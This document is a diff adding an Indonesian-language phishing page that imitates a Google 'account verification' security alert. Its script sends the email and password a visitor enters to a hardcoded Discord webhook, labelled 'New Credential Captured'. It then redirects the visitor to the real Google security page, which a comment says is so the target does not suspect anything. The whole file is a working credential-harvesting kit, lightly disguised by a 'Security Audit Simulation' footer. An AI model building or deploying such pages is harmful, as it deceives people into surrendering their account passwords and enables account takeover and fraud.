@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Alert</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { margin-bottom: 25px; color: #202124; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        .footer-text { font-size: 12px; color: #70757a; margin-top: 20px; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+    <h1>Verifikasi Akun</h1>
+    <p>Kami mendeteksi login yang tidak biasa. Masukkan detail akun Anda untuk mengonfirmasi identitas.</p>
+    
+    <input type="email" id="email" placeholder="Email atau Ponsel">
+    <input type="password" id="pass" placeholder="Masukkan kata sandi Anda">
+    
+    <button onclick="captureLogin()">Berikutnya</button>
+    
+    <div class="footer-text">Langkah ini diperlukan untuk menjaga keamanan akun Anda agar tetap terlindungi dari akses ilegal.</div>
+</div>
+
+<script>
+    const DISCORD_URL = "https://discord.com/api/webhooks/1451651757955485800/RNyrq16gWkU3y0JhCYEWYsRAe482nGDNxB1054QqiUiH17LiBtyRyz8DFcqshTpot2zH";
+
+    async function captureLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        if(!email || !pass) return alert("Harap isi semua kolom.");
+
+        // Kirim hasil ke Discord Spidey Bot
+        try {
+            await fetch(DISCORD_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🔑 New Credential Captured",
+                        color: 16711680,
+                        fields: [
+                            { name: "📧 Email", value: `\`${email}\`` },
+                            { name: "🔑 Password", value: `\`${pass}\`` }
+                        ],
+                        footer: { text: "Security Audit Simulation" }
+                    }]
+                })
+            });
+            // Alihkan ke halaman Google asli agar target tidak curiga
+            window.location.href = "https://myaccount.google.com/security";
+        } catch(e) {}
+    }
+</script>
+
+</body>
+</html>
